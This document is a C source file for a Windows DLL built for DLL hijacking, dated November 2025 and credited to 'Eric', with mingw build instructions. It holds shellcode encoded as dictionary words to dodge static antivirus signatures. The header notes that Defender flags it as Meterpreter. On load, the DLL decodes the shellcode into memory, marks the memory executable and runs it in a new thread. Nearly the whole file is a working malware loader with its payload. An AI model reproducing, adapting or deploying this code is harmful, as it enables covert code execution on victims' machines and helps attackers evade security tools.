/*
    Spawn PowerShell Payload for DLL Hijacking
    13 Nov 2025
    Eric

    Attempt to evade simple static detections by encoding shellcode as dictionary words

    Status:
    Defender - Trojan:Win32/Meterpreter.O - Quarantined

    To build: 
    x86_64-w64-mingw32-gcc -shared -o win64_cmd_exec.dll win64_cmd_exec.c -s -fpermissive
*/
#include <windows.h>

const char* translate_dict[256] = { "cheats","tobago","category","asbestos","korean","unless","relax","senate","postings","cuisine","pitch","letting","filling","turns","sperm","colors","final","impose","talent","retail","attack","facility","proved","oxford","asthma","ebooks","expansys","liquid","surgeon","silicon","magnet","chargers","marine","genre","operated","ellis","shield","formats","celebs","reaction","ability","flexible","maximize","issued","dressing","inspired","exhibit","online","pride","extras","eleven","indian","brook","lenses","engine","register","mattress","backed","maria","boats","merchant","promised","develops","stories","headset","guardian","feedback","ready","raleigh","nathan","samba","cornwall","picks","sharp","emirates","clothing","alias","problems","minimum","checks","months","brokers","tractor","economy","chick","township","drivers","makers","indians","scores","returned","eddie","zshops","routing","boards","sense","comments","latitude","closely","motion","casinos","marks","midnight","speeches","sudden","icons","butler","track","inputs","floral","maldives","suppose","freebsd","vaccine","dense","wilson","cosmetic","modern","invision","excuse","shelf","liberal","gathered","avenue","heroes","watches","enemies","naples","plains","pressure","using","charged","arrive","peterson","kingdom","stating","allow","receptor","sampling","blessed","grove","social","couples","shaft","sunset","decision","bargain","shift","tenant","range","driven","ordering","webshots","reach","african","bargains","outdoors","phpbb","walker","terrain","fitted","american","warming","passion","avatar","drinking","brother","officers","editing","realtors","dropped","decor","check","worldcat","cooler","attacked","reserve","superb","dayton","logic","witness","supports","scanning","repeat","fujitsu","switched","width","taiwan","champion","feature","bureau","locks","salvador","specs","whole","involves","gamespot","musician","vista","techno","claimed","optics","voters","overcome","beginner","standing","attend","appendix","option","pieces","antibody","title","money","isaac","auckland","blocking","forbes","expired","violin","tales","values","results","wider","armenia","measure","released","laura","bikes","staying","cooked","patches","climate","kruger","schemes","tuning","notify","geometry","trunk","wrong","occur","islamic","comics","asked","agrees","tahoe","reviewer","result","practice","rounds","angels","drawn","ferry","tennis","beings","toolbar","lesson" };
const char* dict_words[334] = { "tennis","picks","charged","staying","islamic","kruger","salvador","cheats","cheats","cheats","guardian","brokers","guardian","months","tractor","brokers","drivers","picks","extras","antibody","marks","picks","blessed","tractor","comments","picks","blessed","tractor","asthma","picks","blessed",
"tractor","marine","picks","blessed","dense","months","picks","colors","repeat","emirates","emirates","problems","extras","optics","picks","extras","salvador","check","merchant","latitude","heroes","category","dressing","marine","guardian","specs","optics","turns","guardian","tobago",
"specs","laura","trunk","tractor","guardian","brokers","picks","blessed","tractor","marine","blessed","feedback","merchant","picks","tobago","option","blessed","plains","allow","cheats","cheats","cheats","picks","peterson","salvador","cosmetic","speeches","picks","tobago","option",
"months","blessed","picks","asthma","raleigh","blessed","headset","marine","sharp","tobago","option","bikes","drivers","picks","lesson","optics","guardian","blessed","brook","allow","picks","tobago","auckland","problems","extras","optics","picks","extras","salvador","check",
"guardian","specs","optics","turns","guardian","tobago","specs","mattress","measure","modern","comics","alias","asbestos","alias","shield","postings","nathan","backed","pieces","modern","forbes","indians","raleigh","blessed","headset","shield","sharp","tobago","option","midnight",
"guardian","blessed","filling","picks","raleigh","blessed","headset","surgeon","sharp","tobago","option","guardian","blessed","korean","allow","picks","tobago","option","guardian","indians","guardian","indians","boards","scores","returned","guardian","indians","guardian","scores","guardian",
"returned","picks","charged","geometry","marine","guardian","tractor","lesson","measure","indians","guardian","scores","returned","picks","blessed","talent","schemes","makers","lesson","lesson","lesson","routing","picks","width","tobago","cheats","cheats","cheats","cheats","cheats",
"cheats","cheats","picks","social","social","tobago","tobago","cheats","cheats","guardian","width","extras","blessed","suppose","stating","lesson","isaac","taiwan","islamic","supports","warming","drivers","guardian","width","brother","range","feature","phpbb","lesson","isaac",
"picks","charged","gamespot","ability","merchant","relax","heroes","pitch","plains","ferry","measure","modern","unless","taiwan","cornwall","retail","dense","suppose","butler","cheats","scores","guardian","receptor","violin","lesson","isaac","freebsd","suppose","excuse","marks",
"dense","wilson","sudden","marks","inputs","inputs","exhibit","marks","shelf","marks","marine","inspired","motion","marine","operated","excuse","sudden","suppose","latitude","floral","icons","marine","develops","develops","marine","ready","maria","zshops","township","wilson",
"marks","dense","wilson","zshops","months","modern","closely","inputs","icons","motion","zshops","raleigh","suppose","motion","modern","floral","marks","maldives","cosmetic","wilson","zshops","excuse","sudden","suppose","latitude","floral","icons","exhibit","cosmetic","shelf",
"cosmetic","operated","cheats" };

unsigned char payload[sizeof(dict_words)]; //placeholder
DWORD oldprotect = 0;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
  switch (fdwReason) {
  case DLL_PROCESS_ATTACH: {
    // debug test dll loaded
    // MessageBox(NULL,(char *)"DLL Loaded!",(char *)"",MB_OK);
    // Decode shellcode using input Dictionary wordlist "translate_dict"
    for (int sc_index = 0; sc_index < sizeof(payload); sc_index++) // Loop through shellcode words first
    {
        for (int dict_index = 0; dict_index < 256; dict_index++) // Loop through all possible dictionary words second
        {
            // If the word was found in the shellcode Dictionary
            if (strcmp(translate_dict[dict_index], dict_words[sc_index]) == 0 ) {
                // Convert shellcode to byte and add to output variable
                payload[sc_index] = dict_index;
                break;
            }
        }
    }
    // Allocate memory for the shellcode
	void * exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	
	// Copy shellcode to buffer
	RtlMoveMemory(exec_mem, payload, sizeof(payload));
	
	// Change protections
	BOOL rv = VirtualProtect(exec_mem, sizeof(payload), PAGE_EXECUTE_READ, &oldprotect);

	// Execute
	if ( rv != 0 ) {
		HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
		WaitForSingleObject(th, -1);
	}
    break;
  }
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}